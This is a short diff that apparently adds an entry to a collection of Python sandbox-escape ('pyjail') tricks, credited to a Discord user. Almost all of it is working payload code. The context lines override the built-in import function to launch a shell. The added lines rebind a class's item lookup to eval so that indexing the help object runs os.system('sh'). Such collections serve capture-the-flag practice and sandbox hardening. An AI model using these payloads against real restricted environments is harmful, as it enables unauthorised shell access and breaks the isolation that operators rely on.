@@ -52,3 +52,10 @@ import os
 __builtins__["__import__"] = lambda *a, os=os: os.system("sh")
 import x
 ```
+
+@Hiumee on Discord:
+
+```python
+help.__class__.__getitem__ = eval
+help['__import__("os").system("sh")']
+```
